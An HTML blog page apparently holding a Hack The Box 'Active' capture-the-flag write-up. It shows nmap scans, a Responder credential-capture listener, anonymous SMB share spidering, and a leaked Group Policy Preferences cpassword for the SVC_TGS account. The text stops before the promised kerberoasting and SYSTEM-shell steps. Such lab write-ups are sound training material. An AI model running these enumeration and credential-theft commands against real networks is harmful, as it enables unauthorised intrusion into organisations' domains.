@@ -1,0 +1,427 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="In this box, we take advantage of exposed GPP. With the creds, perform kerberoasting. We are able to crack the TGS we kerberoasted, which is an administrator account. Using ps-exec, we can get a SYSTEM shell."><title>HTB Active Writeup</title><link rel=canonical href=https://trinuro.github.io/p/htb-active-writeup/><link rel=stylesheet href=/scss/style.min.833d6eed45de56f48306bf57268d5b8cdfc8a60e8e7bdc99810464fcd033f7c6.css><meta property='og:title' content="HTB Active Writeup"><meta property='og:description' content="In this box, we take advantage of exposed GPP. With the creds, perform kerberoasting. We are able to crack the TGS we kerberoasted, which is an administrator account. Using ps-exec, we can get a SYSTEM shell."><meta property='og:url' content='https://trinuro.github.io/p/htb-active-writeup/'><meta property='og:site_name' content="Froginacup's site"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='HTB'><meta property='article:published_time' content='2026-02-24T04:04:51-05:00'><meta property='article:modified_time' content='2026-02-24T04:04:51-05:00'><meta name=twitter:title content="HTB Active Writeup"><meta name=twitter:description content="In this box, we take advantage of exposed GPP. With the creds, perform kerberoasting. We are able to crack the TGS we kerberoasted, which is an administrator account. Using ps-exec, we can get a SYSTEM shell."><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_aff73beef7294c1a.jpg width=300 height=299 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>💡</span></figure><div class=site-meta><h1 class=site-name><a href=/>Froginacup's site</a></h1><h2 class=site-description>A place where Froginacup writes his adventures</h2></div></header><ol class=menu-social><li><a href=https://github.com/trinuro target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/projects-and-certificates/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Projects and Certificates</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#port-scan>Port Scan</a></li><li><a href=#ad-research>AD Research</a></li><li><a href=#ldap>LDAP</a></li><li><a href=#wmi---rce>WMI -> RCE?</a></li><li><a href=#smb---rce>SMB -> RCE?</a></li><li><a href=#kerberoasting>Kerberoasting</a></li><li><a href=#review>Review</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/htb-writeups/>Htb-Writeups</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/htb-active-writeup/>HTB Active Writeup</a></h2><h3 class=article-subtitle>In this box, we take advantage of exposed GPP. With the creds, perform kerberoasting. We are able to crack the TGS we kerberoasted, which is an administrator account. Using ps-exec, we can get a SYSTEM shell.</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2026-02-24T04:04:51-05:00>Feb 24, 2026</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>7 minute read</time></div></footer></div></header><section class=article-content><h2 id=port-scan>Port Scan</h2><ol><li>TCP Port Scan</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>sudo nmap -Pn 10.129.192.153 -sS  -p- --min-rate <span class=m>20000</span> -oN nmap/allTcpPortScan.nmap
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 18:26 EST
+</span></span><span class=line><span class=cl>Warning: 10.129.192.153 giving up on port because retransmission cap hit (10).
+</span></span><span class=line><span class=cl>Nmap scan report for 10.129.192.153
+</span></span><span class=line><span class=cl>Host is up (0.035s latency).
+</span></span><span class=line><span class=cl>Not shown: 59657 closed tcp ports (reset), 5855 filtered tcp ports (no-response)
+</span></span><span class=line><span class=cl>PORT      STATE SERVICE
+</span></span><span class=line><span class=cl>53/tcp    open  domain
+</span></span><span class=line><span class=cl>88/tcp    open  kerberos-sec
+</span></span><span class=line><span class=cl>135/tcp   open  msrpc
+</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn
+</span></span><span class=line><span class=cl>389/tcp   open  ldap
+</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds
+</span></span><span class=line><span class=cl>464/tcp   open  kpasswd5
+</span></span><span class=line><span class=cl>593/tcp   open  http-rpc-epmap
+</span></span><span class=line><span class=cl>636/tcp   open  ldapssl
+</span></span><span class=line><span class=cl>3268/tcp  open  globalcatLDAP
+</span></span><span class=line><span class=cl>3269/tcp  open  globalcatLDAPssl
+</span></span><span class=line><span class=cl>5722/tcp  open  msdfsr
+</span></span><span class=line><span class=cl>9389/tcp  open  adws
+</span></span><span class=line><span class=cl>47001/tcp open  winrm
+</span></span><span class=line><span class=cl>49152/tcp open  unknown
+</span></span><span class=line><span class=cl>49153/tcp open  unknown
+</span></span><span class=line><span class=cl>49154/tcp open  unknown
+</span></span><span class=line><span class=cl>49155/tcp open  unknown
+</span></span><span class=line><span class=cl>49157/tcp open  unknown
+</span></span><span class=line><span class=cl>49158/tcp open  unknown
+</span></span><span class=line><span class=cl>49169/tcp open  unknown
+</span></span><span class=line><span class=cl>49171/tcp open  unknown
+</span></span><span class=line><span class=cl>49177/tcp open  unknown
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 16.80 seconds
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>Script and Version Scan</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>sudo nmap -Pn 10.129.192.153 -sCV  -p53,88,135,139,445,464,593,636,3268,3269,5722,9389,47001 --min-rate <span class=m>20000</span> -oN nmap/scriptVersionScan.nmap
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 18:30 EST
+</span></span><span class=line><span class=cl>Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+</span></span><span class=line><span class=cl>Service scan Timing: About 92.31% done; ETC: 18:31 (0:00:03 remaining)
+</span></span><span class=line><span class=cl>Nmap scan report for 10.129.192.153
+</span></span><span class=line><span class=cl>Host is up (0.014s latency).
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>PORT      STATE SERVICE       VERSION
+</span></span><span class=line><span class=cl>53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+</span></span><span class=line><span class=cl>| dns-nsid: 
+</span></span><span class=line><span class=cl>|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+</span></span><span class=line><span class=cl>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-01 23:31:04Z)
+</span></span><span class=line><span class=cl>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds?
+</span></span><span class=line><span class=cl>464/tcp   open  kpasswd5?
+</span></span><span class=line><span class=cl>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class=line><span class=cl>636/tcp   open  tcpwrapped
+</span></span><span class=line><span class=cl>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+</span></span><span class=line><span class=cl>3269/tcp  open  tcpwrapped
+</span></span><span class=line><span class=cl>5722/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span class=line><span class=cl>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span class=line><span class=cl>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span class=line><span class=cl>|_http-title: Not Found
+</span></span><span class=line><span class=cl>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class=line><span class=cl>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Host script results:
+</span></span><span class=line><span class=cl>| smb2-security-mode: 
+</span></span><span class=line><span class=cl>|   2:1:0: 
+</span></span><span class=line><span class=cl>|_    Message signing enabled and required
+</span></span><span class=line><span class=cl>| smb2-time: 
+</span></span><span class=line><span class=cl>|   date: 2026-02-01T23:31:59
+</span></span><span class=line><span class=cl>|_  start_date: 2026-02-01T23:20:51
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 65.32 seconds
+</span></span></code></pre></td></tr></table></div></div><ol start=3><li>UDP Scan</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>sudo nmap -Pn 10.129.192.153 -sU  -p- --min-rate <span class=m>20000</span> -oN nmap/allTcpPortScan.nmap
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PORT    STATE SERVICE
+</span></span><span class=line><span class=cl>53/udp  open  domain
+</span></span><span class=line><span class=cl>88/udp  open  kerberos-sec
+</span></span><span class=line><span class=cl>123/udp open  ntp
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 36.70 seconds
+</span></span></code></pre></td></tr></table></div></div><h2 id=ad-research>AD Research</h2><ol><li>I set up a Responder listener to listen for incoming connections.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>sudo responder -I tun0 -dvw 
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>Since RPC and SMB are available, I will run enum4linux</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>enum4linux 10.129.192.153 -A -C <span class=p>|</span> tee enum4linux_withrpc.txt
+</span></span><span class=line><span class=cl>enum4linux 10.129.192.153 -A <span class=p>|</span> tee enum4linux_withrpc.txt
+</span></span></code></pre></td></tr></table></div></div><p>Output:
+![[Pasted image 20260202074725.png]]
+3. To download all the readable SMB shares,</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>netexec smb 10.129.192.153 -u <span class=s1>&#39;&#39;</span> -p <span class=s1>&#39;&#39;</span> -M spider_plus -o <span class=nv>DOWNLOAD_FLAG</span><span class=o>=</span>True
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;Replication&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;atime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2018-07-21 06:37:44&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;ctime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2018-07-21 06:37:44&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;mtime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2018-07-21 06:38:11&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;size&#34;</span><span class=p>:</span> <span class=s2>&#34;23 B&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=p>},</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;atime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2018-07-21 06:37:44&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;ctime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2018-07-21 06:37:44&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;mtime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2018-07-21 06:38:11&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;size&#34;</span><span class=p>:</span> <span class=s2>&#34;119 B&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=p>},</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;atime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2018-07-21 06:37:44&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;ctime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2018-07-21 06:37:44&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;mtime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2018-07-21 06:38:11&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;size&#34;</span><span class=p>:</span> <span class=s2>&#34;1.07 KB&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=p>},</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;atime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2018-07-21 06:37:44&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;ctime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2018-07-21 06:37:44&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;mtime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2018-07-21 06:38:11&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;size&#34;</span><span class=p>:</span> <span class=s2>&#34;533 B&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=p>},</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;atime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2018-07-21 06:37:44&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;ctime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2018-07-21 06:37:44&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;mtime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2018-07-21 06:38:11&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;size&#34;</span><span class=p>:</span> <span class=s2>&#34;2.72 KB&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=p>},</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;atime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2018-07-21 06:37:44&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;ctime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2018-07-21 06:37:44&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;mtime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2018-07-21 06:38:11&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;size&#34;</span><span class=p>:</span> <span class=s2>&#34;22 B&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=p>},</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;atime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2018-07-21 06:37:44&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;ctime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2018-07-21 06:37:44&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;mtime_epoch&#34;</span><span class=p>:</span> <span class=s2>&#34;2018-07-21 06:38:11&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;size&#34;</span><span class=p>:</span> <span class=s2>&#34;3.63 KB&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span> 
+</span></span></code></pre></td></tr></table></div></div><ol start=4><li>There is an interesting <code>Groups.xml</code> file</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cat ./Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;Groups</span> <span class=na>clsid=</span><span class=s>&#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}&#34;</span><span class=nt>&gt;&lt;User</span> <span class=na>clsid=</span><span class=s>&#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&#34;</span> <span class=na>name=</span><span class=s>&#34;active.htb\SVC_TGS&#34;</span> <span class=na>image=</span><span class=s>&#34;2&#34;</span> <span class=na>changed=</span><span class=s>&#34;2018-07-18 20:46:06&#34;</span> <span class=na>uid=</span><span class=s>&#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}&#34;</span><span class=nt>&gt;&lt;Properties</span> <span class=na>action=</span><span class=s>&#34;U&#34;</span> <span class=na>newName=</span><span class=s>&#34;&#34;</span> <span class=na>fullName=</span><span class=s>&#34;&#34;</span> <span class=na>description=</span><span class=s>&#34;&#34;</span> <span class=na>cpassword=</span><span class=s>&#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34;</span> <span class=na>changeLogon=</span><span class=s>&#34;0&#34;</span> <span class=na>noChange=</span><span class=s>&#34;1&#34;</span> <span class=na>neverExpires=</span><span class=s>&#34;1&#34;</span> <span class=na>acctDisabled=</span><span class=s>&#34;0&#34;</span> <span class=na>userName=</span><span class=s>&#34;active.htb\SVC_TGS&#34;</span><span class=nt>/&gt;&lt;/User&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;/Groups&gt;</span>
